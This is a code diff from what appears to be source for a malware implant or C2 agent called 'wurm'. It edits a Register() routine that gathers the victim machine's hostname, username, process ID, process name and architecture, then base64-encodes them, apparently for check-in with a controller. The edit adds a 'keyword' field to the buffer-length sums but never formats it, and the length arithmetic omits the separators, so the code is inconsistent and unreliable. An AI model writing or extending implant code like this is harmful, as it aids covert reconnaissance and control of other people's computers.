@@ -356,7 +356,7 @@ void Register() {
 
     // Set data allocation format
     wurm.data.status = "register";
-    wurm.data.format = "%s:%s%s%d%s%s";
+    wurm.data.format = "%s:%s,%s,%d,%s,%s";
 
     // Enumerate local machine for information
     if (GetComputerNameA(wurm.info.hostname, &default_length)) {
@@ -401,12 +401,12 @@ void Register() {
     }
 
     // Allocate memory to be encoded
-    DWORD pointer_length = strlen(wurm.data.format) + strlen(wurm.data.status) + strlen(wurm.info.hostname) + strlen(wurm.info.username) + 4 + strlen(wurm.info.name) + strlen(wurm.info.arch);
+    DWORD pointer_length = strlen(wurm.data.format) + strlen(wurm.data.status) + strlen(wurm.info.hostname) + strlen(wurm.info.username) + 4 + strlen(wurm.info.name) + strlen(wurm.info.arch) + strlen(wurm.info.keyword);
     CHAR* data_pointer = malloc(pointer_length); // Must be freed
     sprintf_s(data_pointer, pointer_length, wurm.data.format, wurm.data.status, wurm.info.hostname, wurm.info.username, wurm.info.pid, wurm.info.name, wurm.info.arch);
 
     // Base-64 encode the allocated data structure 
-    DWORD data_length = strlen(wurm.data.status) + strlen(wurm.info.hostname) + strlen(wurm.info.username) + 4 + strlen(wurm.info.name) + strlen(wurm.info.arch) + 2; // Add two null bytes
+    DWORD data_length = strlen(wurm.data.status) + strlen(wurm.info.hostname) + strlen(wurm.info.username) + 4 + strlen(wurm.info.name) + strlen(wurm.info.arch) + strlen(wurm.info.keyword) + 2; // Add two null bytes
     Encode(data_pointer, data_length);
 
     // Allocate buffer in data structure
